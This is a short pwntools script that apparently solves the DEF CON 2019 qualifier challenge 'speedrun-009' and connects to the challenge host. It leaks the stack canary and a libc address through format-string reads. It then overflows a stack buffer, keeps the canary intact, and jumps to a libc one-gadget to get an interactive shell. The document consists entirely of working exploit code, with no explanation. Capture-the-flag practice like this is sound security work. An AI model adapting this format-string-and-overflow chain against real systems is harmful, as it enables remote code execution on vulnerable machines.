from pwn import *

p = remote('speedrun-009.quals2019.oooverflow.io', 31337)
# p = process('./speedrun-009')
e = ELF('/lib/x86_64-linux-gnu/libc-2.27.so')
# context.log_level = 'debug'

pause()
p.recvuntil('3')
p.send('2')
p.send('%163$llx')

p.recvuntil('"')
canary = int(p.recvuntil('00'), 16)

p.recvuntil('3')
p.send('2')
p.send('%169$llx')

p.recvuntil('"')
libc_base = p.recvuntil('97')
libc_base = int(libc_base, 16) - 0x21b97
print(hex(libc_base))

p.recvuntil('3')
p.send('1')
p.send('A' * 0x408 + p64(canary) + 'A' * 8 + p64(libc_base + 0x4f322) + chr(0) * 0x100)

p.recvuntil('3')
p.send('3')

p.interactive()
